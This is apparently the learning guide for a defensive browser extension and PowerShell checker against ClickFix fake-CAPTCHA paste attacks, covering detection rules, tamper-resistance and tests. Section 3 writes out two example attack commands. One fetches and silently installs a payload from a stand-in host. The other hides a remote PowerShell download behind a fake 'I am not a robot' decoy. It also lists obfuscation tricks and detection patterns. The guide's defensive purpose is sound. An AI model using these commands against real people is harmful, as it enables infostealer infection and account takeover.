# Learn how ClickFix First Aid works

This guide explains every part of the project in plain language. You do not need to be a security expert. If you read it top to bottom, you will understand the attack, how each piece of the defense works, and where you could improve it.

## 1. The attack in 60 seconds

1. You visit a page. It could be a search result, an ad, a hacked website, or even a page inside a work task.
2. The page shows something that looks like a CAPTCHA: "Verify you are human".
3. You click the checkbox. Behind the scenes, the page's JavaScript runs `navigator.clipboard.writeText("...")` and puts a command on your clipboard. You see nothing.
4. The page then shows "verification steps": press **Win+R** (opens the Windows Run box), press **Ctrl+V** (pastes), press **Enter** (runs).
5. The command downloads a program and runs it. Usually it is an **infostealer**. It copies your browser's saved passwords and **session cookies** (the little tokens that keep you logged in), plus chat apps' login data and files, and sends them to the attacker.
6. Criminals load your cookies into their own browser and are instantly logged in as you. No password needed, no OTP needed, because as far as the website knows, you already logged in.

Why it works so well: **no software bug is used**. You run the command yourself, so many protections never fire. The Run box is also unfamiliar to most people, so it does not feel dangerous.

There are variants:
- **Win+X**: opens a menu with Terminal / PowerShell.
- **FileFix**: tells you to paste into the **File Explorer address bar** instead, disguised as a file path.
- **Mac**: tells you to open **Terminal** (Cmd+Space) and paste.

## 2. Map of the project

```
rules/clickfix-rules.json     What an attack looks like (the "knowledge")
engine/detector.js            The JavaScript code that applies the rules
extension/                    The Chrome/Edge extension
  src/page-hook.js              Clipboard guard, runs inside web pages
  src/content.js                Re-checks reports, watches page text
  src/ui.js                     The warnings you see
  src/background.js             Settings, counters, connecting the dots, red "!" badge
  popup/                        The window when you click the icon, with "Check a command"
  pages/recovery.html           Offline copy of the recovery guide
checker/src/Check-ClickFix.ps1    Windows PC check (source)
checker/src/Protect-RunDialog.ps1 Win+R / Win+X switch (source)
guide/                        Recovery guide, website and demo (sources)
docs/                         The published website (generated)
tests/                        All tests and harmless fake trap pages
scripts/build.mjs             Turns the sources into the finished files
scripts/check-links.mjs       Checks that the guide's official help links still work
reviews/                      The independent reviews, as PDFs
```

**Single source of truth:** you edit the rules once in `rules/clickfix-rules.json`. The build script (`npm run build`) copies them into the extension and embeds them inside the PowerShell checker. So the browser and the PC check always make the same decisions.

## 3. The rules and how a command is judged

Every pattern in the rules file is a **regular expression** (a text-matching pattern). They are grouped:

| Group | Question it answers | Examples |
|---|---|---|
| `executors` | Does it start a program? | `powershell`, `cmd /c`, `mshta`, `msiexec`, `rundll32`, `iex`, `\| bash` |
| `remote` | Does it reach the internet? | a web address, `curl`, `irm`, an IP address, a network share `\\host\` |
| `encoded` | Is the real content hidden? | `-enc <Base64>`, `FromBase64String`, `base64 -d` |
| `stealth` | Is it trying not to be noticed? Each has a weight. | hidden window (25), `^` disguises (25), silent install (20), raw IP (20), cheap domain like `.top` (15) |
| `decoys` | Does it hide fake text after the real command? | `# I am not a robot - Verification ID: 1234`, or `# C:\HR\Policy.docx` (FileFix) |

Before matching, the engine **undoes simple disguises**: `c^m^d` becomes `cmd`, ``p`o`wershell`` becomes `powershell`, `'pow'+'ershell'` becomes `powershell`.

Then it decides, giving one of three verdicts:

- **block**: clearly an attack. The clipboard gets a harmless "STOP" message and a full warning covers the page.
- **hold**: downloads and runs a program, which is also exactly how real installers look. If the page's own code copied it, the clipboard gets a harmless "PAUSED" message and a small panel offers **Copy anyway** and **Always allow on this site**. If you selected it and pressed Ctrl+C yourself, nothing happens.
- **allow**: everything else.

The rules, in order:

1. Has a fake "I am not a robot" comment after a real command? **Block.** Real tools never do this. (Only CAPTCHA wording counts, like "robot", "Verification ID" or "Ray ID". Ordinary comments like `# verify tests` do not.)
2. The page you can see says "verify you are human", "Win+R" and "paste"? **Block** any command or web address.
3. Starts a program, reaches the internet, and stealth weight is 25 or more? **Block.**
4. Starts a program and stealth weight is 50 or more, even with no download seen? **Block.**
5. Starts a program and reaches the internet, nothing sneaky? **Hold.** If the page mentions Win+R and paste without the "verify" part (like a normal tutorial), or the copy came from an embedded frame, the panel says so.
6. Otherwise: **allow.**

A long script (more than five lines that actually do something) is held instead of blocked, because long legitimate scripts exist. Comment lines and empty lines do not count, so an attacker cannot pad a command with `#` lines to soften it.

Very long text is never simply allowed. The engine checks up to 200,000 characters. Anything longer is held with the reason "too long to check completely", because a page could put a command after a huge run of blank lines (v0.2 only checked the first 20,000 characters, and a test showed that padding hid the command).

### Patterns that must stay fast

Some regular expressions get very slow on unlucky input. `\b[a-z0-9-]+(?:\.[a-z0-9-]+)*\.top` looks innocent, but on text like `a.a.a.a.a...` it tries every way of splitting the dots, again from every starting point. In v0.2 four patterns took over 40 seconds each on 200,000 characters made for this (this is called *catastrophic backtracking*). The fix is to give every repeat a sensible upper limit, like `{1,63}` for one part of a web address, which is also the real limit in DNS, and to start matching only at the beginning of a word. A test now runs every pattern against hostile text and fails if one is slow.

### Worked example: a command shape seen in a real attack

```
cmd /c curl -s -o %TEMP%\S775.msi https://cloubflare.example.top/5 && msiexec /i %TEMP%\S775.msi /qn
```

- Starts programs: `cmd /c`, `msiexec`
- Reaches the internet: a web address, `curl`
- Stealth: saves into `%TEMP%` (10) + silent install `/qn` (20) + cheap `.top` domain (15) = **45**
- 45 is at least 25, so: **block**. The warning lists all six reasons in plain words.

### Worked example: classic fake reCAPTCHA

```
powershell -w h -nop -c "iex(irm https://203.0.113.7/a)" # I am not a robot - reCAPTCHA Verification ID: 4821
```

The `# I am not a robot ...` part is the decoy. In the Run box, only the end of a long line is visible, so the victim sees the friendly text, not the command. Decoy found, so: **block** straight away.

## 4. Part 1: the browser extension

### Content scripts and the two "worlds"

An extension can inject scripts into web pages. Chrome runs them in one of two **worlds**:

- **MAIN world**: the same JavaScript world as the page. We need this to wrap the page's clipboard functions *before* the page uses them. Downside: the page can see and tamper with things here.
- **ISOLATED world**: the extension's private world. The page cannot touch it. Used for reading the page safely and drawing warnings.

`run_at: document_start` makes our scripts run before the page's own scripts.

### The five ways a page can copy, and how each is guarded (`page-hook.js`)

1. `navigator.clipboard.writeText(text)`: we replace the function. If the text is an attack, we call the real function with the safe message instead.
2. `navigator.clipboard.write([ClipboardItem])`: we call the browser straight away with a new item whose text is checked before it is handed over.
3. `document.execCommand('copy')` on a hidden text box: we note that the page started the copy, and our `copy` listener checks the selected text.
4. A page `copy` handler calling `event.clipboardData.setData(...)`: we wrap `setData`.
5. A page `copy` handler calling `event.clipboardData.items.add(text, 'text/plain')`: we wrap `add` too, and take a final look at the end of every copy event.

### Tamper protection: the lessons from the security review

A hostile page shares the MAIN world with our guard, so it can try to break it. The review found three real tricks, and each one taught a rule:

- **Give a different answer the second time.** A page passed an object whose `toString()` returned "hello" the first time and the attack the second time. Our check saw "hello", the browser wrote the attack. *Rule: convert the input to text once, then check and write that same string.*
- **Poison the built-ins.** `Object.defineProperty(Array.prototype, '0', { set() {} })` makes `list[0] = x` silently do nothing, so every list of matches stayed empty and the verdict became "allow". *Rule: the engine never writes into ordinary arrays or objects at run time. It uses `defineProperty` and objects with no prototype, and grabs every built-in function the moment it loads.* While fixing this we found one more: `String.replace` secretly calls `RegExp.prototype.exec`, which a page can replace. So the disguise-removal step is now a plain character loop.
- **Use a path you did not wrap.** `clipboardData.items.add()` writes text without calling `setData`. *Rule: list every way in, and add a final check at the end.*

### Pause, then let the person decide

Blocking every installer would break developer sites. Letting them through silently is what an attacker wants. So a download-and-run command copied by a page's own code is **paused**: the clipboard gets this harmless message instead:

```
# PAUSED. ClickFix First Aid held this copied text so you can check it first. Go back to the page and choose Copy anyway only if you trust the site.
```

The panel's **Copy anyway** button runs in the extension's isolated world, which has its own untouched copy of the clipboard functions, so it can write the original command without our own guard stopping it. It always copies the whole text: if the text is too long to pass on in full, the button is not offered, rather than copying a cut-off part.

### The safe messages

Both the STOP and PAUSED messages start with `#`, which makes PowerShell and bash treat the whole line as a comment. In the Run box, cmd, File Explorer or the Mac's zsh they simply fail with "not found". They contain no quotes, `|`, `&`, `$` or `>`, which a shell could act on.

### A private line to the extension

In v0.1 the guard sent its reports as a normal page event. The review showed a page could listen to that event, stop it so no warning appeared, or send fake ones with its own text, like a fake "call support" number. Now:

1. The guard creates an element with a **closed** shadow root and puts a small node inside it. A closed shadow root cannot be opened by page scripts.
2. The extension's isolated world opens it with `chrome.dom.openOrClosedShadowRoot`, a function only extensions have, starts listening on the node, and removes the element from the page.
3. Reports travel as events on that node, which the page has no way to reach.

Warnings are also drawn inside a closed shadow root (`ui.js`), all text is inserted as plain text, and text from the page has links broken and phone numbers removed. Two more locks since v0.3: the isolated world runs its own check on every report and ignores one whose text has nothing command-like in it, and the warning buttons only react to real clicks by the person (`event.isTrusted`).

### Reading the page, and connecting the dots

`content.js` reads the page text in every frame, including closed shadow roots and text added with CSS (`::before` / `::after`), and looks for the trap pattern: a run shortcut (Win+R, Win+X, File Explorer address bar, Cmd+Space) **and** "paste" **and** a "verify / CAPTCHA / fix the error" theme. Only text you can see can trigger a block. Hidden text can only lead to a pause, because hidden text on normal sites (data blobs, menus) often mentions "Ctrl+V".

There is one catch for a project like this: its own website explains the attack in exactly those words, so it looked like a trap page to its own extension. The fix is a short list of exact addresses (the project website and its README on GitHub, built from `package.json`) where the banner is not shown and page text cannot turn a copy into a block. Attack commands are still blocked there, and the demo page is left off the list on purpose.

The background (`background.js`) then connects the dots within a tab: a paused copy plus trap instructions anywhere in the tab, in any frame, before the copy or within 20 seconds after it, becomes a full block warning. This catches traps that hide their steps in another frame or only show them after the copy.

One catch: Chrome stops an extension's background worker after about 30 seconds without events, and starts a fresh one for the next event. Anything kept only in the worker's memory is then gone. In v0.2 the "this tab showed trap steps" note lived in memory, so a copy 40 seconds later was only paused instead of blocked. Since v0.3 the notes live in `chrome.storage.session`, which survives the worker restarting, is kept in memory only, is cleared when the browser closes, and cannot be read by web pages or content scripts. All changes to settings and notes go through one queue, so two events at the same moment cannot overwrite each other. A test stops the worker on purpose in the middle of an attack.

### Permissions

Only `storage` (counters, settings, allowed sites) and the right to run on pages. No network access at all, so nothing can be sent anywhere. The extension's own pages also carry a Content Security Policy with `connect-src 'none'`, so even a bug in the popup could not make a network request.

### Check a command

The popup has a box where you can paste a command a site gave you, before running it. It runs the same rules, right there in the popup, and never runs the text. The honest part is the wording: "No known attack pattern found" does not mean "safe", and the popup says so.

## 5. Part 2: the PC check (`Check-ClickFix.ps1`)

It answers: "Did this PC already run a ClickFix command?" Investigators look in these places:

| Place | Why |
|---|---|
| `HKCU\...\Explorer\RunMRU` | Windows remembers what was typed or pasted into the Run box. A ClickFix command usually sits right there. |
| `HKCU\...\Explorer\TypedPaths` | The File Explorer address bar history, which catches FileFix. |
| PowerShell history (`PSReadLine\*_history.txt`) | Commands pasted into PowerShell or Terminal. |
| New `.exe/.msi/.ps1/...` files in Temp and AppData | Where downloaded malware usually lands. Unsigned ones are flagged for review. |
| Windows Installer log (event 1033) | Programs installed recently. Random-looking names like `NYcTodYVA0` are flagged. |
| Run keys, Startup folders, scheduled tasks | How malware makes itself start again after a reboot. |

Each command found goes through the same rules. The result is **danger** (signs of an attack), **review** (check these items) or **clean**.

Design choices:
- **Read-only.** It never deletes anything. Deleting the wrong thing can break a PC, and evidence is useful.
- **ASCII only.** Windows PowerShell 5.1 reads script files as ANSI, so any fancy character would turn into garbage. The build refuses non-ASCII text.
- **Run by right-click, never by pasting.** It would be ironic to teach people to paste commands from a website in order to protect themselves from pasting commands from a website.

## 6. Part 3: the Win+R switch (`Protect-RunDialog.ps1`)

Windows has a per-user setting called `DisabledHotkeys` under `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced`. Putting the letters `R` and `X` in it turns off Win+R and Win+X. The script adds or removes only those two letters (keeping any others), then restarts File Explorer. It also checks that Windows Terminal still warns before pasting several lines.

## 7. Part 4: the recovery guide

`guide/recovery.html` is the plan that worked in a real incident, in order:

1. Disconnect the PC.
2. From the **phone**, secure email first, because email can reset everything else.
3. Sign out of all sessions everywhere else. This matters more than changing passwords, because the stolen thing is your *session*, not your password.
4. Clean the PC: offline scan, or reset Windows.
5. Keep watch for months: login alerts, scam calls using your real details, your credit report.

Every menu path in it was checked against the official help pages of Google, Microsoft, Telegram and others. Menus change, so the guide also says what to search for if a menu has moved.

## 8. How it is tested

| Command | What it checks |
|---|---|
| `npm test` | 80 engine tests: 26 attack shapes are blocked, 21 normal things are allowed, 11 installers are held, page detection in several phrasings and languages, frames, tamper resistance, long-text padding, pattern speed, and 7 contract cases from the independent QA suite. |
| `npm run test:ps` | 116 PowerShell tests: the checker makes the **same decisions** as the JavaScript engine on all 58 shared samples, whole-PC analysis with fake evidence, installer-log fields, the Win+R helper, and scripts parse and are pure ASCII. |
| `npm run test:e2e` | 52 tests that load the real extension into Chromium: all five copy methods, frames, late or hidden steps, Copy anyway (including very long text), Always allow, copying by hand, a page hijacking a hand copy, the background worker being stopped mid-attack, the popup's command check and settings, the no-network rule for extension pages, and the 24 proof-of-concept pages from the security review. |

Three good habits we used:
- **Control run.** Run the same trap pages with the extension *switched off* and confirm the attack text really lands on the clipboard. Otherwise a test can pass for the wrong reason.
- **Test first for a gap.** When a weakness was spotted, we first wrote a test for it and watched it **fail**, then fixed the code and watched it pass.
- **Get an outside review, then verify it.** The Perplexity review was mostly right, but not completely. One suggested correction to the recovery guide (the Defender scan's name and duration) did not match Microsoft's own documentation, so it was not applied. Treat reviews like any other source: check them.
- **Check a rewrite against your own tests.** The second review round came with a complete rewrite of the extension. Running our test samples through its engine showed it missed 2 of the 26 attack shapes, blocked 10 of our 11 legitimate installer and one-liner samples (on purpose: it has no Copy anyway), and could be switched off by a page that replaces `RegExp.prototype[Symbol.replace]`. So we kept our code and took its good ideas instead (see CHANGELOG.md).
- **Antivirus reads your test files too.** Readable samples of disguised PowerShell made Microsoft Defender quarantine our test data file the first time the project was unzipped on Windows. The samples are now stored base64-encoded and decoded only in memory while the tests run. Security projects that keep attack samples usually do something like this. The fake trap pages got the same treatment after Defender flagged two of them (Trojan:HTML/FakeCaptcha): they live in one encoded file and the test server decodes them in memory.
- **Make the slow case a test.** Speed problems hide until someone sends unlucky input. A test that times every pattern on hostile text keeps them from coming back.

## 9. Ideas for next versions (good places to contribute)

- Translations of the warnings and the guide, for example Hindi and Telugu.
- Publish to the Chrome Web Store and Microsoft Edge Add-ons.
- Firefox support.
- A Mac version of the PC check (Terminal history, LaunchAgents).
- Collect new real-world ClickFix commands (safely defanged) as test samples.
- A short video showing the attack and the block, for social media awareness.

## 10. Glossary

- **ClickFix**: a fake check that tricks you into pasting and running a command.
- **Infostealer**: malware that copies saved passwords, cookies and files, then sends them away.
- **Session cookie**: a token that keeps you logged in. Whoever has it is "you" to the website until you sign out.
- **Clipboard**: what Ctrl+C copies and Ctrl+V pastes.
- **Run box**: the small Windows window that opens with Win+R and runs whatever you type.
- **LOLBin** ("living off the land" binary): a normal Windows program (like `mshta` or `certutil`) abused by attackers, so no new malware tool is needed at first.
- **Obfuscation**: disguising text so security tools do not recognize it, like `c^m^d`.
- **Defang**: breaking a dangerous link so it cannot be clicked, like `hxxps[://]`.
- **Closed shadow root**: a sealed part of a page that page scripts cannot open. Extensions can, with `chrome.dom.openOrClosedShadowRoot`.
- **Prototype poisoning**: changing a built-in like `Array.prototype` so that ordinary code quietly misbehaves.
- **TOCTOU** ("time of check, time of use"): checking one value and then using a different one.
- **Regular expression**: a pattern for matching text.
- **Catastrophic backtracking**: when a regular expression tries a huge number of ways to match unlucky text and becomes extremely slow.
- **Service worker**: the background part of an extension. Chrome starts and stops it as needed, so it must not keep important things only in memory.
- **Content Security Policy (CSP)**: rules a page gives the browser about what it may load or connect to.
- **Shadow root**: a private, sealed part of a web page.
